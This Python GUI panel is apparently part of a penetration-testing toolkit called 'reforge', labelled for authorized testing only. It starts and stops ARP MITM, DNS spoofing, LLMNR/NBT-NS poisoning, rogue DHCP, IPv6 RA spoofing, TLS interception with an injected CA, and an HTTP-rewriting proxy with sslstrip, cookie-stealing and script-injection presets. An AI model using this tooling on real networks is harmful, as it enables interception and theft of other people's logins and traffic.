"""Active MITM controls: ARP spoof, DNS spoof, name-service poisoning.

Each section constructs a module and starts/stops its runner (root required).
For authorized testing only.
"""

from __future__ import annotations

import threading

from PySide6.QtCore import Qt, QTimer
from PySide6.QtWidgets import (
    QCheckBox,
    QComboBox,
    QFileDialog,
    QGroupBox,
    QHBoxLayout,
    QHeaderView,
    QLabel,
    QLineEdit,
    QPlainTextEdit,
    QPushButton,
    QSpinBox,
    QTableWidget,
    QTableWidgetItem,
    QVBoxLayout,
    QWidget,
)

from reforge.capture.registry import list_interfaces
from reforge.gui.errors import explain


def _ifaces():
    return list_interfaces() or ["<none>"]


# TCP-proxy quick setups: (label, full config of the proxy's toggles/fields)
def _setup(sslstrip=False, stripenc=False, cookie=False, inject="",
           intercept=False, keyword="", direction="both") -> dict:
    return {"sslstrip": sslstrip, "stripenc": stripenc, "cookie": cookie,
            "inject": inject, "intercept": intercept, "keyword": keyword, "dir": direction}


_QUICK_SETUPS = [
    ("Clear", _setup()),
    ("sslstrip (downgrade HTTPS)", _setup(sslstrip=True, stripenc=True)),
    ("Steal secure cookies", _setup(stripenc=True, cookie=True)),
    ("Full rewrite", _setup(sslstrip=True, stripenc=True, cookie=True)),
    ("Hold logins for edit", _setup(stripenc=True, intercept=True,
                                    keyword="login", direction="requests")),
]


class AttacksPanel(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        # set by the main window: returns a shared InterceptQueue (and shows it in
        # the Intercept tab) for interactive message interception.
        self.get_intercept_queue = None
        self._arp = None
        self._dns = None
        self._name = None
        self._tls = None
        self._ca = None
        self._tcp = None
        self._dhcp = None
        self._ndp = None

        root = QVBoxLayout(self)
        note = QLabel("Active on-path attacks — authorized engagements only. Needs root.")
        note.setStyleSheet("color: palette(mid);")
        root.addWidget(note)
        root.addWidget(self._arp_box())
        root.addWidget(self._dns_box())
        root.addWidget(self._name_box())
        root.addWidget(self._dhcp_box())
        root.addWidget(self._ndp_box())
        root.addWidget(self._tls_box())
        root.addWidget(self._tcpproxy_box())
        root.addStretch(1)

    # ---- ARP ----------------------------------------------------------------
    def _arp_box(self) -> QGroupBox:
        box = QGroupBox("ARP man-in-the-middle — discover a segment, pick victims, MITM")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.arp_if = QComboBox(); self.arp_if.addItems(_ifaces())
        self.arp_gw = QLineEdit(); self.arp_gw.setPlaceholderText("gateway (auto)")
        self.arp_gw.setMaximumWidth(150)
        b_disc = QPushButton("Discover hosts"); b_disc.clicked.connect(self._arp_discover)
        self.arp_start_btn = QPushButton("Start MITM"); self.arp_start_btn.clicked.connect(self._arp_start)
        b_stop = QPushButton("Restore && stop"); b_stop.clicked.connect(self._arp_stop)
        for w in (QLabel("Iface:"), self.arp_if, QLabel("GW:"), self.arp_gw,
                  b_disc, self.arp_start_btn, b_stop):
            row.addWidget(w)
        v.addLayout(row)

        self.arp_hosts = QTableWidget(0, 2)
        self.arp_hosts.setHorizontalHeaderLabels(["Victim (check to target)", "MAC"])
        self.arp_hosts.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self.arp_hosts.verticalHeader().setVisible(False)
        self.arp_hosts.setMaximumHeight(150)
        self.arp_hosts.setSelectionMode(QTableWidget.NoSelection)
        self.arp_hosts.setEditTriggers(QTableWidget.NoEditTriggers)
        v.addWidget(self.arp_hosts)

        self.arp_status = QLabel("Pick an interface and Discover hosts. Then check victims and Start MITM.")
        self.arp_status.setWordWrap(True)
        v.addWidget(self.arp_status)

        self._arp = None
        self._arp_busy = False
        self._arp_result = None
        self._arp_timer = QTimer(self); self._arp_timer.setInterval(400)
        self._arp_timer.timeout.connect(self._arp_tick)
        return box

    def _arp_checked_victims(self) -> list:
        gw = self.arp_gw.text().strip()
        out = []
        for r in range(self.arp_hosts.rowCount()):
            it = self.arp_hosts.item(r, 0)
            if it is not None and it.checkState() == Qt.Checked:
                ip = it.data(Qt.UserRole)
                if ip and ip != gw:
                    out.append(ip)
        return out

    def _arp_discover(self):
        if self._arp_busy:
            return
        iface = self.arp_if.currentText()
        self._arp_busy = True
        self.arp_status.setText(f"Discovering hosts on {iface}… (ARP-scanning the subnet)")
        self.arp_status.setStyleSheet("")

        def work():
            try:
                from reforge.attacks.arp_mitm import default_gateway, discover_hosts
                hosts = discover_hosts(iface)
                self._arp_result = ("hosts", hosts, default_gateway(iface))
            except Exception as exc:
                self._arp_result = ("error", explain(exc))

        threading.Thread(target=work, daemon=True).start()
        self._arp_timer.start()

    def _arp_start(self):
        from reforge.attacks.arp_mitm import ArpMitm

        self._arp_stop()
        victims = self._arp_checked_victims()
        if not victims:
            self.arp_status.setText("Check at least one victim in the list first.")
            return
        gw = self.arp_gw.text().strip() or None
        self._arp = ArpMitm(self.arp_if.currentText(), victims, gateway=gw)
        self._arp_busy = True
        self.arp_status.setText("Starting MITM (resolving MACs, enabling forwarding)…")

        def work():
            try:
                if not self._arp.start():
                    self._arp_result = ("startfail", "; ".join(self._arp.warnings) or "could not start")
            except Exception as exc:
                self._arp_result = ("error", explain(exc))

        threading.Thread(target=work, daemon=True).start()
        self._arp_timer.start()

    def _populate_hosts(self, hosts, gw):
        self.arp_hosts.setRowCount(0)
        for ip, mac in hosts:
            r = self.arp_hosts.rowCount(); self.arp_hosts.insertRow(r)
            label = ip + ("  (gateway)" if gw and ip == gw else "")
            item = QTableWidgetItem(label)
            item.setFlags(item.flags() | Qt.ItemIsUserCheckable)
            item.setCheckState(Qt.Unchecked)
            item.setData(Qt.UserRole, ip)
            self.arp_hosts.setItem(r, 0, item)
            self.arp_hosts.setItem(r, 1, QTableWidgetItem(mac))
        if gw and not self.arp_gw.text().strip():
            self.arp_gw.setText(gw)

    def _arp_tick(self):
        res, self._arp_result = self._arp_result, None
        if res is not None:
            self._arp_busy = False
            if res[0] == "hosts":
                _tag, hosts, gw = res
                self._populate_hosts(hosts, gw)
                self.arp_status.setText(
                    f"Found {len(hosts)} host(s). Check victims (gateway {gw or '?'} used "
                    "automatically), then Start MITM.")
            elif res[0] == "startfail":
                self.arp_status.setText(f"Could not start: {res[1]}")
                self.arp_status.setStyleSheet("color:#ff5c6c; font-weight:600;")
            elif res[0] == "error":
                self.arp_status.setText(f"error: {res[1]}")
                self.arp_status.setStyleSheet("color:#ff5c6c; font-weight:600;")
        if self._arp is not None and self._arp.status().get("running"):
            self._render_arp_status(self._arp.status())
        elif self._arp is None and not self._arp_busy:
            self._arp_timer.stop()

    def _render_arp_status(self, st):
        fwd_ok = st["forwarding_on"]
        fwd = "ON" if fwd_ok else "OFF ⚠ victims will lose connectivity"
        msg = (f"● MITM ACTIVE — {len(st['targets'])} target(s) ↔ {st['gateway']}   "
               f"forwarding {fwd}   ·   relayed {st['relayed']}   ·   poison sent {st['sent']}")
        if st["unresolved"]:
            msg += f"   (unresolved: {', '.join(st['unresolved'])})"
        self.arp_status.setText(msg)
        self.arp_status.setStyleSheet(
            f"color:{'#3ddc97' if fwd_ok else '#ff5c6c'}; font-weight:700;")

    def _arp_stop(self):
        if self._arp:
            try:
                self._arp.stop()
            except Exception:
                pass
            self._arp = None
            self.arp_status.setText("Stopped — ARP caches restored.")
            self.arp_status.setStyleSheet("")

    # ---- DNS ----------------------------------------------------------------
    def _dns_box(self) -> QGroupBox:
        box = QGroupBox("DNS spoofing (forge answers)")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.dns_if = QComboBox(); self.dns_if.addItems(_ifaces())
        b_start = QPushButton("Start"); b_start.clicked.connect(self._dns_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._dns_stop)
        for w in (QLabel("Iface:"), self.dns_if, b_start, b_stop):
            row.addWidget(w)
        row.addStretch(1)
        v.addLayout(row)
        self.dns_map = QPlainTextEdit()
        self.dns_map.setPlaceholderText("one mapping per line:  host=ip   (e.g. *.corp.local=10.0.0.66)")
        self.dns_map.setMaximumHeight(80)
        v.addWidget(self.dns_map)
        self.dns_status = QLabel("idle"); v.addWidget(self.dns_status)
        return box

    def _parse_map(self) -> dict:
        out = {}
        for line in self.dns_map.toPlainText().splitlines():
            if "=" in line:
                k, _, val = line.partition("=")
                out[k.strip().lower()] = val.strip()
        return out

    def _dns_start(self):
        from reforge.attacks.dns_spoof import DnsSpoofer

        self._dns_stop()
        hostmap = self._parse_map()
        if not hostmap:
            self.dns_status.setText("no mappings defined")
            return
        self._dns = DnsSpoofer(self.dns_if.currentText(), hostmap)
        try:
            self._dns.start()
            self.dns_status.setText(f"spoofing ({len(hostmap)} mappings)…")
        except Exception as exc:
            self.dns_status.setText(f"error: {explain(exc)}")

    def _dns_stop(self):
        if self._dns:
            try:
                self._dns.stop()
            except Exception:
                pass
            self._dns = None
            self.dns_status.setText("stopped")

    # ---- name poisoning -----------------------------------------------------
    def _name_box(self) -> QGroupBox:
        box = QGroupBox("Name poisoning (LLMNR / mDNS / NBT-NS)")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.name_if = QComboBox(); self.name_if.addItems(_ifaces())
        self.name_ip = QLineEdit(); self.name_ip.setPlaceholderText("our IP (redirect target)")
        b_start = QPushButton("Start"); b_start.clicked.connect(self._name_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._name_stop)
        for w in (QLabel("Iface:"), self.name_if, self.name_ip, b_start, b_stop):
            row.addWidget(w)
        v.addLayout(row)
        self.name_status = QLabel("idle"); v.addWidget(self.name_status)
        return box

    def _name_start(self):
        from reforge.attacks.namepoison import NamePoisoner

        self._name_stop()
        self._name = NamePoisoner(self.name_if.currentText(), self.name_ip.text().strip())
        try:
            self._name.start()
            self.name_status.setText("poisoning name queries…")
        except Exception as exc:
            self.name_status.setText(f"error: {explain(exc)}")

    def _name_stop(self):
        if self._name:
            try:
                self._name.stop()
            except Exception:
                pass
            self._name = None
            self.name_status.setText("stopped")

    # ---- DHCP ---------------------------------------------------------------
    def _dhcp_box(self) -> QGroupBox:
        box = QGroupBox("DHCP — starvation / rogue server")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.dhcp_if = QComboBox(); self.dhcp_if.addItems(_ifaces())
        self.dhcp_mode = QComboBox(); self.dhcp_mode.addItems(["starvation", "rogue"])
        self.dhcp_server = QLineEdit(); self.dhcp_server.setPlaceholderText("rogue: server/gw/DNS IP")
        b_start = QPushButton("Start"); b_start.clicked.connect(self._dhcp_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._dhcp_stop)
        for w in (QLabel("Iface:"), self.dhcp_if, QLabel("Mode:"), self.dhcp_mode,
                  self.dhcp_server, b_start, b_stop):
            row.addWidget(w)
        v.addLayout(row)
        self.dhcp_status = QLabel("idle"); v.addWidget(self.dhcp_status)
        return box

    def _dhcp_start(self):
        from reforge.attacks import dhcp

        self._dhcp_stop()
        iface = self.dhcp_if.currentText()
        try:
            if self.dhcp_mode.currentText() == "starvation":
                self._dhcp = dhcp.DhcpStarvation(iface)
            else:
                srv = self.dhcp_server.text().strip()
                if not srv:
                    self.dhcp_status.setText("rogue mode needs a server/gateway IP"); return
                self._dhcp = dhcp.RogueDhcp(iface, srv, gateway=srv, dns=srv)
            self._dhcp.start()
            self.dhcp_status.setText(f"{self.dhcp_mode.currentText()} running on {iface}…")
        except Exception as exc:
            self.dhcp_status.setText(f"error: {explain(exc)}")

    def _dhcp_stop(self):
        if self._dhcp:
            try:
                self._dhcp.stop()
            except Exception:
                pass
            self._dhcp = None
            self.dhcp_status.setText("stopped")

    # ---- NDP (IPv6) ---------------------------------------------------------
    def _ndp_box(self) -> QGroupBox:
        box = QGroupBox("NDP / IPv6 — NA spoof / rogue RA")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.ndp_if = QComboBox(); self.ndp_if.addItems(_ifaces())
        self.ndp_mode = QComboBox(); self.ndp_mode.addItems(["na-spoof", "rogue-ra"])
        self.ndp_target = QLineEdit(); self.ndp_target.setPlaceholderText("target IPv6 (na)")
        self.ndp_victim = QLineEdit(); self.ndp_victim.setPlaceholderText("victim IPv6 (na)")
        self.ndp_mac = QLineEdit(); self.ndp_mac.setPlaceholderText("our MAC")
        b_start = QPushButton("Start"); b_start.clicked.connect(self._ndp_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._ndp_stop)
        for w in (QLabel("Iface:"), self.ndp_if, self.ndp_mode, self.ndp_target,
                  self.ndp_victim, self.ndp_mac, b_start, b_stop):
            row.addWidget(w)
        v.addLayout(row)
        self.ndp_status = QLabel("idle"); v.addWidget(self.ndp_status)
        return box

    def _ndp_start(self):
        from reforge.attacks import ndp

        self._ndp_stop()
        iface = self.ndp_if.currentText()
        mac = self.ndp_mac.text().strip()
        try:
            if self.ndp_mode.currentText() == "na-spoof":
                self._ndp = ndp.NdpSpoofer(iface, self.ndp_target.text().strip(),
                                           self.ndp_victim.text().strip(), mac)
            else:
                self._ndp = ndp.RogueRouter(iface, mac)
            self._ndp.start()
            self.ndp_status.setText(f"{self.ndp_mode.currentText()} running on {iface}…")
        except Exception as exc:
            self.ndp_status.setText(f"error: {explain(exc)}")

    def _ndp_stop(self):
        if self._ndp:
            try:
                self._ndp.stop()
            except Exception:
                pass
            self._ndp = None
            self.ndp_status.setText("stopped")

    # ---- TLS interception ---------------------------------------------------
    def _tls_box(self) -> QGroupBox:
        box = QGroupBox("TLS interception (certificate-injection MITM)")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.tls_port = QSpinBox(); self.tls_port.setRange(1, 65535); self.tls_port.setValue(8443)
        b_start = QPushButton("Start"); b_start.clicked.connect(self._tls_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._tls_stop)
        b_ca = QPushButton("Export CA cert"); b_ca.clicked.connect(self._tls_export_ca)
        self.tls_rewrite = QCheckBox("apply HTTP rewrite")
        self.tls_rewrite.setToolTip("Run the TCP-proxy HTTP transforms on decrypted HTTPS")
        for w in (QLabel("Listen port:"), self.tls_port, b_start, b_stop, b_ca, self.tls_rewrite):
            row.addWidget(w)
        row.addStretch(1)
        v.addLayout(row)
        self.tls_status = QLabel("idle — redirect victim 443→listen port and install the CA")
        v.addWidget(self.tls_status)
        return box

    def _ensure_ca(self):
        from reforge.attacks.tls_ca import DynamicCA

        if self._ca is None:
            self._ca = DynamicCA()
        return self._ca

    def _tls_start(self):
        from reforge.attacks.tls_proxy import TlsInterceptor

        self._tls_stop()
        ca = self._ensure_ca()
        transforms = self._build_http_transforms() if self.tls_rewrite.isChecked() else None
        self._tls = TlsInterceptor(ca, listen=("0.0.0.0", self.tls_port.value()),
                                   http_transforms=transforms)
        try:
            port = self._tls.start()
            extra = f" + HTTP rewrite ({len(transforms)})" if transforms else ""
            self.tls_status.setText(f"intercepting on :{port}{extra} — export + install "
                                    f"the CA, redirect 443→{port}")
        except Exception as exc:
            self.tls_status.setText(f"error: {explain(exc)}")

    def _tls_stop(self):
        if self._tls:
            try:
                self._tls.stop()
            except Exception:
                pass
            self._tls = None
            self.tls_status.setText("stopped")

    def _tls_export_ca(self):
        path, _ = QFileDialog.getSaveFileName(self, "Export CA certificate",
                                              "reforge-ca.pem", "PEM (*.pem *.crt)")
        if not path:
            return
        self._ensure_ca().write_ca(path)
        self.tls_status.setText(f"CA written to {path} — install it on the victim as trusted root")

    # ---- TCP proxy (HTTP rewrite, large bodies) -----------------------------
    def _tcpproxy_box(self) -> QGroupBox:
        box = QGroupBox("TCP proxy — HTTP rewrite across full/large bodies (R2)")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.tp_port = QSpinBox(); self.tp_port.setRange(1, 65535); self.tp_port.setValue(8080)
        self.tp_target = QLineEdit(); self.tp_target.setPlaceholderText("upstream host:port (blank = SO_ORIGINAL_DST)")
        b_start = QPushButton("Start"); b_start.clicked.connect(self._tcp_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._tcp_stop)
        self.tp_quick = QComboBox(); self.tp_quick.addItem("Quick setup…")
        for label, _cfg in _QUICK_SETUPS:
            self.tp_quick.addItem(label)
        self.tp_quick.setToolTip("Configure the proxy for a common scenario")
        self.tp_quick.activated.connect(self._apply_quick_setup)
        for w in (QLabel("Listen:"), self.tp_port, QLabel("Upstream:"), self.tp_target,
                  self.tp_quick, b_start, b_stop):
            row.addWidget(w)
        v.addLayout(row)
        row2 = QHBoxLayout()
        self.tp_sslstrip = QCheckBox("sslstrip")
        self.tp_stripenc = QCheckBox("strip-encoding"); self.tp_stripenc.setChecked(True)
        self.tp_cookie = QCheckBox("strip-cookie")
        self.tp_inject = QLineEdit(); self.tp_inject.setPlaceholderText("inject HTML/JS before </body> (optional)")
        for w in (self.tp_sslstrip, self.tp_stripenc, self.tp_cookie, QLabel("Inject:"), self.tp_inject):
            row2.addWidget(w)
        v.addLayout(row2)
        row3 = QHBoxLayout()
        self.tp_intercept = QCheckBox("Interactive intercept")
        self.tp_intercept.setToolTip("Hold matching HTTP messages in the Intercept tab "
                                     "for edit before forwarding (whole messages, not packets)")
        self.tp_int_keyword = QLineEdit()
        self.tp_int_keyword.setPlaceholderText("hold messages containing… (blank = all)")
        self.tp_int_dir = QComboBox(); self.tp_int_dir.addItems(["both", "requests", "responses"])
        for w in (self.tp_intercept, QLabel("match:"), self.tp_int_keyword,
                  QLabel("dir:"), self.tp_int_dir):
            row3.addWidget(w)
        v.addLayout(row3)
        self.tp_status = QLabel("idle — redirect victim HTTP → listen port")
        v.addWidget(self.tp_status)
        return box

    def _apply_quick_setup(self, index: int) -> None:
        if index <= 0:
            return
        cfg = _QUICK_SETUPS[index - 1][1]
        self.tp_sslstrip.setChecked(cfg["sslstrip"])
        self.tp_stripenc.setChecked(cfg["stripenc"])
        self.tp_cookie.setChecked(cfg["cookie"])
        self.tp_inject.setText(cfg["inject"])
        self.tp_intercept.setChecked(cfg["intercept"])
        self.tp_int_keyword.setText(cfg["keyword"])
        self.tp_int_dir.setCurrentText(cfg["dir"])
        self.tp_quick.setCurrentIndex(0)            # behave like a menu
        self.tp_status.setText(f"Configured: {_QUICK_SETUPS[index - 1][0]} — set upstream, Start.")

    def _build_interceptor(self):
        """A MessageInterceptor sharing the Intercept tab's queue, if enabled."""
        if not self.tp_intercept.isChecked() or self.get_intercept_queue is None:
            return None
        from reforge.attacks.msg_intercept import MessageInterceptor

        if self.get_intercept_queue() is None:
            return None
        # pass the provider (not a fixed queue) so holds always land in the queue
        # the operator is currently watching, even if a bridge replaces it.
        return MessageInterceptor(self.get_intercept_queue,
                                  keyword=self.tp_int_keyword.text().strip(),
                                  direction=self.tp_int_dir.currentText())

    def _build_http_transforms(self) -> list:
        from reforge.attacks import tcp_proxy

        transforms = []
        if self.tp_sslstrip.isChecked():
            transforms.append(tcp_proxy.sslstrip())
        if self.tp_stripenc.isChecked():
            transforms.append(tcp_proxy.strip_accept_encoding())
        if self.tp_cookie.isChecked():
            transforms.append(tcp_proxy.strip_secure_cookie())
        if self.tp_inject.text().strip():
            transforms.append(tcp_proxy.inject(self.tp_inject.text().encode()))
        return transforms

    def _tcp_start(self):
        from reforge.attacks import tcp_proxy

        self._tcp_stop()
        target = self.tp_target.text().strip()
        if target:
            host, _, port = target.partition(":")
            resolver = (lambda c, h=host, p=int(port or 80): (h, p))
        else:
            resolver = (lambda c: tcp_proxy.so_original_dst(c) or ("127.0.0.1", 80))

        transforms = self._build_http_transforms()
        interceptor = self._build_interceptor()
        self._tcp = tcp_proxy.TcpProxy(resolver, http_transforms=transforms,
                                       listen=("0.0.0.0", self.tp_port.value()),
                                       interceptor=interceptor)
        try:
            port = self._tcp.start()
            extra = " + interactive intercept" if interceptor else ""
            self.tp_status.setText(
                f"proxying on :{port} ({len(transforms)} transform(s)){extra}")
        except Exception as exc:
            self.tp_status.setText(f"error: {explain(exc)}")

    def _tcp_stop(self):
        if self._tcp:
            try:
                self._tcp.stop()
            except Exception:
                pass
            self._tcp = None
            self.tp_status.setText("stopped")

    def stop_all(self):
        self._arp_stop(); self._dns_stop(); self._name_stop()
        self._dhcp_stop(); self._ndp_stop()
        self._tls_stop(); self._tcp_stop()
